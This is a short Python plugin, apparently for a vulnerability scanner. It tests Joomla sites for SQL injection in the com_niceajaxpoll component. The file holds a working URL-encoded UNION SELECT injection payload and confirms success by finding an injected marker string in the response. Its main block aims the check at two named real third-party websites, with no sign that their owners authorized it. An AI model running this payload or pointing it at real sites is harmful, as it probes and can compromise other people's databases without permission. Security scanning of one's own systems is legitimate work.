#/usr/bin/python
#-*- coding: utf-8 -*-
#Refer https://www.sebug.net/vuldb/ssvid-90196
#__Author__ = 上善若水
#_PlugName_ = joomla_sql Plugin
#_FileName_ = joomla_sql.py



def assign(service, arg):
    if service == "joomla":
        return True, arg

def audit(arg):
    payload = 'index.php/?option=com_niceajaxpoll&getpliseid=-6725%20UNION%20ALL%20SELECT%2094,94,CONCAT(0x71626a7671,0x5759706d737349577448575a6f5553684e4d4b70506a4b436f785a78677557674267524475744468,0x71766b6271),94#'
    url = arg + payload
    code, head, res, errcode, _url = curl.curl2(url)
    if code == 200 and 'qbjvqWYpmssIWtHWZoUShNMKpPjKCoxZxguWgBgRDutDhqvkbq' in res:
        security_hole(url)
            
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('joomla', 'http://www.bnsh.co.ir/')[1])
    audit(assign('joomla', 'http://www.radiowijayafm.com/')[1])